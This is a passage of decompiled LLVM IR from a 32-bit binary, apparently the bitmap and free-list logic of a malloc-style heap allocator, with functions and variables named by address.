  %v2_8050af4 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050af4, i32* %eax.global-to-local, align 4
  %v4_8050afc = call i32 @function_8050b78(i32 %v2_8050af4, i32 %arg1, i32 %v0_8050af1, i32 %v0_8050af1)
  store i32 %v4_8050afc, i32* %eax.global-to-local, align 4
  %v2_8050b04 = icmp slt i32 %v4_8050afc, 0
  br i1 %v2_8050b04, label %dec_label_pc_8050b4c, label %dec_label_pc_8050b08

dec_label_pc_8050b08:                             ; preds = %dec_label_pc_8050af1
  %v4_8050b10 = call i32 @function_8050b54(i32 ptrtoint (i32* @global_var_8054560.31 to i32), i32 %arg1, i32 %v4_8050afc, i32 %v4_8050afc)
  %v2_8050b29 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8050b2e = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050b2e, i32* %eax.global-to-local, align 4
  %v4_8050b37 = call i32 @function_8052327(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8050b29)
  store i32 %v4_8050b37, i32* %eax.global-to-local, align 4
  %v2_8050b3f = icmp slt i32 %v4_8050b37, 0
  %v3_8050b43 = load i32, i32* %stack_var_-284, align 4
  %.v3_8050b43 = select i1 %v2_8050b3f, i32 -1, i32 %v3_8050b43
  br label %dec_label_pc_8050b4c

dec_label_pc_8050b4c:                             ; preds = %dec_label_pc_8050b08, %dec_label_pc_8050ac8, %dec_label_pc_8050af1
  %storemerge = phi i32 [ -1, %dec_label_pc_8050af1 ], [ -1, %dec_label_pc_8050ac8 ], [ %.v3_8050b43, %dec_label_pc_8050b08 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050aee, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 8, 1, 2, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8050b4c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge, { 1, 0 }
}

define i32 @function_8050b54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b54:
  %v1_8050b62 = add i32 %arg2, -1
  %v1_8050b65 = urem i32 %v1_8050b62, 32
  %v2_8050b65 = icmp eq i32 %v1_8050b65, 0
  %v2_8050b68 = udiv i32 %v1_8050b62, 32
  br i1 %v2_8050b65, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050b54
  %v5_8050b6b = shl i32 1, %v1_8050b65
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050b54, %bb
  %v6_8050b6d = phi i32 [ 1, %dec_label_pc_8050b54 ], [ %v5_8050b6b, %bb ]
  %v2_8050b6d = mul nuw nsw i32 %v2_8050b68, 4
  %v3_8050b6d = add i32 %v2_8050b6d, %arg1
  %v4_8050b6d = inttoptr i32 %v3_8050b6d to i32*
  %v5_8050b6d = load i32, i32* %v4_8050b6d, align 4
  %v7_8050b6d = and i32 %v5_8050b6d, %v6_8050b6d
  %v8_8050b6d = icmp eq i32 %v7_8050b6d, 0
  %v1_8050b71 = icmp eq i1 %v8_8050b6d, false
  %v2_8050b71 = zext i1 %v1_8050b71 to i32
  ret i32 %v2_8050b71

; uselistorder directives
  uselistorder i32 %v1_8050b65, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050b78(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b78:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b78 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b78, i32* %stack_var_-4, align 4
  %v1_8050b86 = add i32 %arg2, -1
  %v1_8050b89 = urem i32 %v1_8050b86, 32
  %v2_8050b89 = icmp eq i32 %v1_8050b89, 0
  store i32 %v1_8050b89, i32* @ecx, align 4
  %v2_8050b8c = udiv i32 %v1_8050b86, 32
  store i32 %v2_8050b8c, i32* @edx, align 4
  br i1 %v2_8050b89, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050b78
  %v5_8050b8f = shl i32 1, %v1_8050b89
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050b78, %bb
  %v6_8050b91 = phi i32 [ 1, %dec_label_pc_8050b78 ], [ %v5_8050b8f, %bb ]
  %v2_8050b91 = mul nuw nsw i32 %v2_8050b8c, 4
  %v3_8050b91 = add i32 %v2_8050b91, %arg1
  %v4_8050b91 = inttoptr i32 %v3_8050b91 to i32*
  %v5_8050b91 = load i32, i32* %v4_8050b91, align 4
  %v7_8050b91 = or i32 %v5_8050b91, %v6_8050b91
  store i32 %v7_8050b91, i32* %v4_8050b91, align 4
  %v2_8050b96 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050b96, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050b8c, { 1, 0 }
  uselistorder i32 %v1_8050b89, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050b98() local_unnamed_addr {
dec_label_pc_8050b98:
  %v0_8050b98 = load i32, i32* @eax, align 4
  %v6_8050bab = icmp ugt i32 %v0_8050b98, 16777215
  br i1 %v6_8050bab, label %dec_label_pc_8050bbc, label %dec_label_pc_8050bad

dec_label_pc_8050bad:                             ; preds = %dec_label_pc_8050b98
  %v2_8050b9b = udiv i32 %v0_8050b98, 256
  %tmp = icmp ult i32 %v0_8050b98, 256
  %v2_8050bad = call i32 @llvm.ctlz.i32(i32 %v2_8050b9b, i1 true)
  %v3_8050bad = xor i32 %v2_8050bad, 31
  %v5_8050bad = select i1 %tmp, i32 95, i32 %v3_8050bad
  %v1_8050bb0 = add nuw nsw i32 %v5_8050bad, 6
  %v2_8050bb3 = urem i32 %v1_8050bb0, 32
  %v4_8050bb3 = icmp eq i32 %v2_8050bb3, 0
  br i1 %v4_8050bb3, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050bad
  %v5_8050bb3 = lshr i32 %v0_8050b98, %v2_8050bb3
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050bad, %bb
  %v0_8050bb5 = phi i32 [ %v0_8050b98, %dec_label_pc_8050bad ], [ %v5_8050bb3, %bb ]
  %v1_8050bb5 = urem i32 %v0_8050bb5, 4
  %v2_8050bb8 = mul nuw nsw i32 %v5_8050bad, 4
  %v3_8050bb8 = or i32 %v1_8050bb5, 32
  %v4_8050bb8 = add nuw nsw i32 %v3_8050bb8, %v2_8050bb8
  br label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050b98, %bb4
  %v0_8050bbd = phi i32 [ 95, %dec_label_pc_8050b98 ], [ %v4_8050bb8, %bb4 ]
  ret i32 %v0_8050bbd

; uselistorder directives
  uselistorder i32 %v2_8050bb3, { 1, 0 }
  uselistorder i32 %v0_8050b98, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8050bbc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8050bbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050bbe:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050bbe = load i32, i32* @ebp, align 4
  %v0_8050bbf = load i32, i32* @edi, align 4
  %v0_8050bc0 = load i32, i32* @esi, align 4
  %v0_8050bc1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050bc1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050bd3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050bd3, i32* @eax, align 4
  store i32 %v2_8050bd3, i32* %stack_var_-92, align 4
  %v2_8050bd8 = call i32 @function_80520ea(i32 %v2_8050bd3, i32 134553831)
  store i32 %v2_8050bd8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054300.32 to i32), i32* %stack_var_-92, align 4
  %v1_8050be4 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054300.32 to i32))
  store i32 %v1_8050be4, i32* %eax.global-to-local, align 4
  %v0_8050bec = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_8050bec, -32
  br i1 %tmp123, label %dec_label_pc_8050c03, label %dec_label_pc_8050bf1

dec_label_pc_8050bf1:                             ; preds = %dec_label_pc_8050bbe
  %v0_8050bf1 = load i32, i32* %stack_var_-92, align 4
  %v1_8050bf1 = call i32 @function_805078b(i32 %v0_8050bf1)
  store i32 %v1_8050bf1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050bf8 = inttoptr i32 %v1_8050bf1 to i32*
  store i32 12, i32* %v1_8050bf8, align 4
  br label %dec_label_pc_8051328

dec_label_pc_8050c03:                             ; preds = %dec_label_pc_8050bbe
  %v1_8050c03 = add i32 %v0_8050bec, 11
  %tmp124 = icmp ult i32 %v1_8050c03, 16
  %v1_8050c13 = and i32 %v1_8050c03, -8
  %v1_8050c03.v1_8050c13 = select i1 %tmp124, i32 %v1_8050c03, i32 %v1_8050c13
  %.v1_8050c13 = select i1 %tmp124, i32 16, i32 %v1_8050c13
  store i32 %v1_8050c03.v1_8050c13, i32* %eax.global-to-local, align 4
  %v0_8050c1a = load i8, i8* @global_var_80545e0.33, align 1
  %v1_8050c1a = sext i8 %v0_8050c1a to i32
  store i32 %v1_8050c1a, i32* @ebx, align 4
  %v3_8050c20 = urem i8 %v0_8050c1a, 2
  %v4_8050c20 = icmp eq i8 %v3_8050c20, 0
  %v1_8050c23 = icmp eq i1 %v4_8050c20, false
  br i1 %v1_8050c23, label %dec_label_pc_8050c42, label %dec_label_pc_8050c25

dec_label_pc_8050c25:                             ; preds = %dec_label_pc_8050c03
  %v2_8050c25 = icmp eq i8 %v0_8050c1a, 0
  %v1_8050c27 = icmp eq i1 %v2_8050c25, false
  br i1 %v1_8050c27, label %dec_label_pc_8050f1d, label %dec_label_pc_8050c2d

dec_label_pc_8050c2d:                             ; preds = %dec_label_pc_8050c25
  store i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050c35 = call i32 @function_80517db(i32* bitcast (i8* @global_var_80545e0.33 to i32*))
  store i32 %v2_8050c35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f1d

dec_label_pc_8050c42:                             ; preds = %dec_label_pc_8050c03
  %v11_8050c42 = trunc i32 %.v1_8050c13 to i8
  %v8_8050c46 = icmp ugt i8 %v11_8050c42, %v0_8050c1a
  br i1 %v8_8050c46, label %dec_label_pc_8050c63, label %dec_label_pc_8050c48

dec_label_pc_8050c48:                             ; preds = %dec_label_pc_8050c42
  %v2_8050c4c = udiv i32 %.v1_8050c13, 2
  store i32 %v2_8050c4c, i32* %eax.global-to-local, align 4
  %v1_8050c4e = add i32 %v2_8050c4c, ptrtoint (i8* @global_var_80545e0.33 to i32)
  store i32 %v1_8050c4e, i32* %ecx.global-to-local, align 4
  %v1_8050c54 = add i32 %v2_8050c4c, add (i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32 -4)
  %v2_8050c54 = inttoptr i32 %v1_8050c54 to i32*
  %v3_8050c54 = load i32, i32* %v2_8050c54, align 4
  store i32 %v3_8050c54, i32* @edx, align 4
  %v1_8050c57 = icmp eq i32 %v3_8050c54, 0
  br i1 %v1_8050c57, label %dec_label_pc_8050c63, label %dec_label_pc_8050c5b

dec_label_pc_8050c5b:                             ; preds = %dec_label_pc_8050c48
  %v1_8050c5b = add i32 %v3_8050c54, 8
  %v2_8050c5b = inttoptr i32 %v1_8050c5b to i32*
  %v3_8050c5b = load i32, i32* %v2_8050c5b, align 4
  store i32 %v3_8050c5b, i32* %eax.global-to-local, align 4
  store i32 %v3_8050c5b, i32* %v2_8050c54, align 4
  br label %dec_label_pc_8050c9c

dec_label_pc_8050c63:                             ; preds = %dec_label_pc_8050c48, %dec_label_pc_8050c42
  %v8_8050c63 = icmp ult i32 %.v1_8050c13, 255
  %v6_8050c6b = icmp ugt i32 %.v1_8050c13, 255
  store i32 %.v1_8050c13, i32* @eax, align 4
  br i1 %v6_8050c6b, label %dec_label_pc_8050ca4, label %dec_label_pc_8050c6d

dec_label_pc_8050c6d:                             ; preds = %dec_label_pc_8050c63
  %v2_8050c71 = udiv i32 %.v1_8050c13, 8
  store i32 %v2_8050c71, i32* %eax.global-to-local, align 4
  %v1_8050c78 = mul nuw i32 %v2_8050c71, 8
  %v2_8050c78 = add i32 %v1_8050c78, ptrtoint (i32* @global_var_805460c.34 to i32)
  store i32 %v2_8050c78, i32* %ecx.global-to-local, align 4
  %v1_8050c7f = add i32 %v1_8050c78, add (i32 ptrtoint (i32* @global_var_805460c.34 to i32), i32 12)
  %v2_8050c7f = inttoptr i32 %v1_8050c7f to i32*
  %v3_8050c7f = load i32, i32* %v2_8050c7f, align 4
  store i32 %v3_8050c7f, i32* @edx, align 4
  %v12_8050c82 = icmp eq i32 %v3_8050c7f, %v2_8050c78
  br i1 %v12_8050c82, label %dec_label_pc_8050da0.preheader, label %dec_label_pc_8050c8a

dec_label_pc_8050c8a:                             ; preds = %dec_label_pc_8050c6d
  store i32 %.v1_8050c13, i32* %ebx.global-to-local, align 4
  %v1_8050c8e = add i32 %v3_8050c7f, 12
  %v2_8050c8e = inttoptr i32 %v1_8050c8e to i32*
  %v3_8050c8e = load i32, i32* %v2_8050c8e, align 4
  store i32 %v3_8050c8e, i32* %eax.global-to-local, align 4
  store i32 %v3_8050c8e, i32* %v2_8050c7f, align 4
  %v0_8050c94 = load i32, i32* @edx, align 4
  %v1_8050c94 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c94 = add i32 %v0_8050c94, 4
  %v3_8050c94 = add i32 %v2_8050c94, %v1_8050c94
  %v4_8050c94 = inttoptr i32 %v3_8050c94 to i32*
  %v5_8050c94 = load i32, i32* %v4_8050c94, align 4
  %v6_8050c94 = or i32 %v5_8050c94, 1
  store i32 %v6_8050c94, i32* %v4_8050c94, align 4
  %v0_8050c99 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c99 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c99 = add i32 %v1_8050c99, 8
  %v3_8050c99 = inttoptr i32 %v2_8050c99 to i32*
  store i32 %v0_8050c99, i32* %v3_8050c99, align 4
  br label %dec_label_pc_8050c9c

dec_label_pc_8050c9c:                             ; preds = %dec_label_pc_8051039, %dec_label_pc_805104b, %dec_label_pc_8050c5b, %dec_label_pc_8050c8a
  %v0_8050c9c = load i32, i32* @edx, align 4
  %v1_8050c9c = add i32 %v0_8050c9c, 8
  store i32 %v1_8050c9c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8050ca4:                             ; preds = %dec_label_pc_8050c63
  %v0_8050ca8 = call i32 @function_8050b98()
  store i32 %v0_8050ca8, i32* %eax.global-to-local, align 4
  %v3_8050cad = and i8 %v0_8050c1a, 2
  %v4_8050cad = icmp eq i8 %v3_8050cad, 0
  %v6_8050cad = zext i8 %v3_8050cad to i32
  %v9_8050cad = and i32 %v1_8050c1a, -256
  %v10_8050cad = or i32 %v9_8050cad, %v6_8050cad
  store i32 %v10_8050cad, i32* @ebx, align 4
  br i1 %v4_8050cad, label %dec_label_pc_8050da0.preheader, label %dec_label_pc_8050cba

dec_label_pc_8050cba:                             ; preds = %dec_label_pc_8050ca4
  store i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050cc2 = call i32 @function_80517db(i32* bitcast (i8* @global_var_80545e0.33 to i32*))
  store i32 %v2_8050cc2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050da0.preheader

dec_label_pc_8050da0.preheader:                   ; preds = %dec_label_pc_8050cba, %dec_label_pc_8050c6d, %dec_label_pc_8050ca4
  %stack_var_-40.0.ph = phi i32 [ %v2_8050c71, %dec_label_pc_8050c6d ], [ %v0_8050ca8, %dec_label_pc_8050cba ], [ %v0_8050ca8, %dec_label_pc_8050ca4 ]
  %v0_8050da09 = load i32, i32* @global_var_8054620.37, align 32
  store i32 %v0_8050da09, i32* @ebp, align 4
  %v9_8050da615 = icmp eq i32 %v0_8050da09, 134563348
  %v1_8050dac17 = icmp eq i1 %v9_8050da615, false
  br i1 %v1_8050dac17, label %dec_label_pc_8050ccf.lr.ph, label %dec_label_pc_8050db2

dec_label_pc_8050ccf.lr.ph:                       ; preds = %dec_label_pc_8050da0.preheader
  %v1_8050cf6 = add i32 %.v1_8050c13, 16
  br label %dec_label_pc_8050ccf

dec_label_pc_8050ccf:                             ; preds = %dec_label_pc_8050ccf.lr.ph, %dec_label_pc_8050da0
  %v1_80512c9 = phi i32 [ %v0_8050da09, %dec_label_pc_8050ccf.lr.ph ], [ %v0_8050da0, %dec_label_pc_8050da0 ]
  %v1_8050ccf = add i32 %v1_80512c9, 4
  %v2_8050ccf = inttoptr i32 %v1_8050ccf to i32*
  %v3_8050ccf = load i32, i32* %v2_8050ccf, align 4
  %v1_8050cd2 = add i32 %v1_80512c9, 12
  %v2_8050cd2 = inttoptr i32 %v1_8050cd2 to i32*
  %v3_8050cd2 = load i32, i32* %v2_8050cd2, align 4
  store i32 %v3_8050cd2, i32* @edx, align 4
  %v1_8050cd5 = and i32 %v3_8050ccf, -4
  store i32 %v1_8050cd5, i32* @edi, align 4
  %v9_8050ce2 = icmp eq i32 %v3_8050cd2, 134563348
  %v1_8050ce8 = icmp eq i1 %v9_8050ce2, false
  %or.cond95 = or i1 %v6_8050c6b, %v1_8050ce8
  br i1 %or.cond95, label %dec_label_pc_8050d01, label %dec_label_pc_8050cea

dec_label_pc_8050cea:                             ; preds = %dec_label_pc_8050ccf
  %v1_8050cea = load i32, i32* @global_var_8054610.35, align 16
  %v12_8050cea = icmp eq i32 %v1_80512c9, %v1_8050cea
  %v1_8050cf0 = icmp eq i1 %v12_8050cea, false
  br i1 %v1_8050cf0, label %dec_label_pc_8050d01, label %dec_label_pc_8050cf2

dec_label_pc_8050cf2:                             ; preds = %dec_label_pc_8050cea
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  %v6_8050cfb = icmp ugt i32 %v1_8050cd5, %v1_8050cf6
  br i1 %v6_8050cfb, label %dec_label_pc_80512b2, label %dec_label_pc_8050d01

dec_label_pc_8050d01:                             ; preds = %dec_label_pc_8050cf2, %dec_label_pc_8050cea, %dec_label_pc_8050ccf
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %eax.global-to-local, align 4
  %v2_8050d06 = add i32 %v3_8050cd2, 8
  %v3_8050d06 = inttoptr i32 %v2_8050d06 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v3_8050d06, align 4
  %v0_8050d09 = load i32, i32* @edx, align 4
  store i32 %v0_8050d09, i32* @global_var_8054620.37, align 4
  %v0_8050d0c = load i32, i32* @edi, align 4
  %v15_8050d0c = icmp eq i32 %v0_8050d0c, %.v1_8050c13
  br i1 %v15_8050d0c, label %dec_label_pc_80512f3, label %dec_label_pc_8050d16

dec_label_pc_8050d16:                             ; preds = %dec_label_pc_8050d01
  %v6_8050d1c = icmp ugt i32 %v0_8050d0c, 255
  br i1 %v6_8050d1c, label %dec_label_pc_8050d2f, label %dec_label_pc_8050d1e

dec_label_pc_8050d1e:                             ; preds = %dec_label_pc_8050d16
  %v2_8050d20 = udiv i32 %v0_8050d0c, 8
  store i32 %v2_8050d20, i32* %esi.global-to-local, align 4
  %v1_8050d23 = mul nuw i32 %v2_8050d20, 8
  %v2_8050d23 = add i32 %v1_8050d23, 134563340
  store i32 %v2_8050d23, i32* @ebx, align 4
  %v1_8050d2a = add i32 %v1_8050d23, 134563348
  %v2_8050d2a = inttoptr i32 %v1_8050d2a to i32*
  %v3_8050d2a = load i32, i32* %v2_8050d2a, align 4
  store i32 %v3_8050d2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d78

dec_label_pc_8050d2f:                             ; preds = %dec_label_pc_8050d16
  store i32 %v0_8050d0c, i32* @eax, align 4
  %v0_8050d31 = call i32 @function_8050b98()
  store i32 %v0_8050d31, i32* %esi.global-to-local, align 4
  %v1_8050d38 = mul i32 %v0_8050d31, 8
  %v2_8050d38 = add i32 %v1_8050d38, ptrtoint (i32* @global_var_805460c.34 to i32)
  store i32 %v2_8050d38, i32* %eax.global-to-local, align 4
  %v1_8050d3f = add i32 %v1_8050d38, add (i32 ptrtoint (i32* @global_var_805460c.34 to i32), i32 8)
  %v2_8050d3f = inttoptr i32 %v1_8050d3f to i32*
  %v3_8050d3f = load i32, i32* %v2_8050d3f, align 4
  store i32 %v3_8050d3f, i32* %edx.global-to-local, align 4
  store i32 %v3_8050d3f, i32* @ebx, align 4
  %v12_8050d48 = icmp eq i32 %v3_8050d3f, %v2_8050d38
  br i1 %v12_8050d48, label %dec_label_pc_8050d78, label %dec_label_pc_8050d4c

dec_label_pc_8050d4c:                             ; preds = %dec_label_pc_8050d2f
  %v1_8050d4c = add i32 %v1_8050d38, add (i32 ptrtoint (i32* @global_var_805460c.34 to i32), i32 12)
  %v2_8050d4c = inttoptr i32 %v1_8050d4c to i32*
  %v3_8050d4c = load i32, i32* %v2_8050d4c, align 4
  store i32 %v3_8050d4c, i32* @ebx, align 4
  %v0_8050d4f = load i32, i32* @edi, align 4
  %v2_8050d4f = add i32 %v3_8050d4c, 4
  %v3_8050d4f = inttoptr i32 %v2_8050d4f to i32*
  %v4_8050d4f = load i32, i32* %v3_8050d4f, align 4
  %v10_8050d4f = icmp ult i32 %v0_8050d4f, %v4_8050d4f
  %v1_8050d52 = icmp eq i1 %v10_8050d4f, false
  br i1 %v1_8050d52, label %dec_label_pc_8050d5a, label %dec_label_pc_8050d78

dec_label_pc_8050d5a:                             ; preds = %dec_label_pc_8050d4c
  %v1_8050d5c = or i32 %v0_8050d4f, 1
  store i32 %v1_8050d5c, i32* %eax.global-to-local, align 4
  store i32 %v3_8050d3f, i32* %ebx.global-to-local, align 4
  %v2_8050d70109 = add i32 %v3_8050d3f, 4
  %v3_8050d70110 = inttoptr i32 %v2_8050d70109 to i32*
  %v4_8050d70111 = load i32, i32* %v3_8050d70110, align 4
  %v10_8050d70112 = icmp ult i32 %v1_8050d5c, %v4_8050d70111
  br i1 %v10_8050d70112, label %dec_label_pc_8050d61, label %dec_label_pc_8050d75

dec_label_pc_8050d61:                             ; preds = %dec_label_pc_8050d5a, %dec_label_pc_8050d61
  %v0_8050d75113 = phi i32 [ %v3_8050d65, %dec_label_pc_8050d61 ], [ %v3_8050d3f, %dec_label_pc_8050d5a ]
  store i32 %v0_8050d75113, i32* %ecx.global-to-local, align 4
  %v1_8050d65 = add i32 %v0_8050d75113, 8
  %v2_8050d65 = inttoptr i32 %v1_8050d65 to i32*
  %v3_8050d65 = load i32, i32* %v2_8050d65, align 4
  store i32 %v3_8050d65, i32* %ecx.global-to-local, align 4
  store i32 %v3_8050d65, i32* %ebx.global-to-local, align 4
  %v2_8050d70 = add i32 %v3_8050d65, 4
  %v3_8050d70 = inttoptr i32 %v2_8050d70 to i32*
  %v4_8050d70 = load i32, i32* %v3_8050d70, align 4
  %v10_8050d70 = icmp ult i32 %v1_8050d5c, %v4_8050d70
  br i1 %v10_8050d70, label %dec_label_pc_8050d61, label %dec_label_pc_8050d75

dec_label_pc_8050d75:                             ; preds = %dec_label_pc_8050d61, %dec_label_pc_8050d5a
  %v0_8050d75.lcssa = phi i32 [ %v3_8050d3f, %dec_label_pc_8050d5a ], [ %v3_8050d65, %dec_label_pc_8050d61 ]
  %v1_8050d75 = add i32 %v0_8050d75.lcssa, 12
  %v2_8050d75 = inttoptr i32 %v1_8050d75 to i32*
  %v3_8050d75 = load i32, i32* %v2_8050d75, align 4
  store i32 %v3_8050d75, i32* @ebx, align 4
  br label %dec_label_pc_8050d78

dec_label_pc_8050d78:                             ; preds = %dec_label_pc_8050d1e, %dec_label_pc_8050d4c, %dec_label_pc_8050d2f, %dec_label_pc_8050d75
  %v0_8050d78 = phi i32 [ %v0_8050d31, %dec_label_pc_8050d2f ], [ %v0_8050d31, %dec_label_pc_8050d75 ], [ %v0_8050d31, %dec_label_pc_8050d4c ], [ %v2_8050d20, %dec_label_pc_8050d1e ]
  %stack_var_-64.1 = phi i32 [ %v2_8050d38, %dec_label_pc_8050d2f ], [ %v0_8050d75.lcssa, %dec_label_pc_8050d75 ], [ %v2_8050d38, %dec_label_pc_8050d4c ], [ %v3_8050d2a, %dec_label_pc_8050d1e ]
  %v1_8050d7a = urem i32 %v0_8050d78, 32
  %v2_8050d7a = icmp eq i32 %v1_8050d7a, 0
  store i32 %v1_8050d7a, i32* %esi.global-to-local, align 4
  store i32 %v1_8050d7a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8050d84 = sdiv i32 %v0_8050d78, 32
  store i32 %v2_8050d84, i32* %edx.global-to-local, align 4
  br i1 %v2_8050d7a, label %dec_label_pc_8050da0, label %bb

bb:                                               ; preds = %dec_label_pc_8050d78
  %v5_8050d87 = shl i32 1, %v1_8050d7a
  store i32 %v5_8050d87, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050da0:                             ; preds = %dec_label_pc_8050d78, %bb
  %v5_8050d89 = phi i32 [ 1, %dec_label_pc_8050d78 ], [ %v5_8050d87, %bb ]
  %v1_8050d89 = mul nsw i32 %v2_8050d84, 4
  %v2_8050d89 = add i32 %v1_8050d89, ptrtoint (i32* @global_var_8054914.38 to i32)
  %v3_8050d89 = inttoptr i32 %v2_8050d89 to i32*
  %v4_8050d89 = load i32, i32* %v3_8050d89, align 4
  %v6_8050d89 = or i32 %v4_8050d89, %v5_8050d89
  store i32 %v6_8050d89, i32* %v3_8050d89, align 4
  %v0_8050d90 = load i32, i32* @ebx, align 4
  %v1_8050d90 = load i32, i32* @ebp, align 4
  %v2_8050d90 = add i32 %v1_8050d90, 12
  %v3_8050d90 = inttoptr i32 %v2_8050d90 to i32*
  store i32 %v0_8050d90, i32* %v3_8050d90, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8050d97 = load i32, i32* @ebp, align 4
  %v2_8050d97 = add i32 %v1_8050d97, 8
  %v3_8050d97 = inttoptr i32 %v2_8050d97 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8050d97, align 4
  %v0_8050d9a = load i32, i32* @ebp, align 4
  %v1_8050d9a = load i32, i32* @ebx, align 4
  %v2_8050d9a = add i32 %v1_8050d9a, 8
  %v3_8050d9a = inttoptr i32 %v2_8050d9a to i32*
  store i32 %v0_8050d9a, i32* %v3_8050d9a, align 4
  %v0_8050d9d = load i32, i32* @ebp, align 4
  %v1_8050d9d = load i32, i32* @esi, align 4
  %v2_8050d9d = add i32 %v1_8050d9d, 12
  %v3_8050d9d = inttoptr i32 %v2_8050d9d to i32*
  store i32 %v0_8050d9d, i32* %v3_8050d9d, align 4
  %v0_8050da0 = load i32, i32* @global_var_8054620.37, align 32
  store i32 %v0_8050da0, i32* @ebp, align 4
  %v9_8050da6 = icmp eq i32 %v0_8050da0, 134563348
  %v1_8050dac = icmp eq i1 %v9_8050da6, false
  br i1 %v1_8050dac, label %dec_label_pc_8050ccf, label %dec_label_pc_8050db2

dec_label_pc_8050db2:                             ; preds = %dec_label_pc_8050da0, %dec_label_pc_8050da0.preheader
  br i1 %v8_8050c63, label %dec_label_pc_8050e40, label %dec_label_pc_8050dc0

dec_label_pc_8050dc0:                             ; preds = %dec_label_pc_8050db2
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050dc4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050dc4 = add i32 %v1_8050dc4, ptrtoint (i32* @global_var_805460c.34 to i32)
  store i32 %v2_8050dc4, i32* %edx.global-to-local, align 4
  %v1_8050dcb = add i32 %v1_8050dc4, add (i32 ptrtoint (i32* @global_var_805460c.34 to i32), i32 12)
  %v2_8050dcb = inttoptr i32 %v1_8050dcb to i32*
  %storemerge1.pre = load i32, i32* %v2_8050dcb, align 4
  br label %dec_label_pc_8050e3c

dec_label_pc_8050dd0:                             ; preds = %dec_label_pc_8050e3c
  %v1_8050dd0 = add i32 %v4_8050de7, 4
  %v2_8050dd0 = inttoptr i32 %v1_8050dd0 to i32*
  %v3_8050dd0 = load i32, i32* %v2_8050dd0, align 4
  store i32 %v3_8050dd0, i32* %ebx.global-to-local, align 4
  %v1_8050dd3 = add i32 %v4_8050de7, 12
  %v2_8050dd3 = inttoptr i32 %v1_8050dd3 to i32*
  %v3_8050dd3 = load i32, i32* %v2_8050dd3, align 4
  store i32 %v3_8050dd3, i32* @ecx, align 4
  %v1_8050dd6 = and i32 %v3_8050dd0, -4
  store i32 %v1_8050dd6, i32* @ebx, align 4
  %v10_8050dd9 = icmp ult i32 %v1_8050dd6, %.v1_8050c13
  br i1 %v10_8050dd9, label %dec_label_pc_8050e3c, label %dec_label_pc_8050ddf

dec_label_pc_8050ddf:                             ; preds = %dec_label_pc_8050dd0
  %v1_8050ddf = add i32 %v4_8050de7, 8
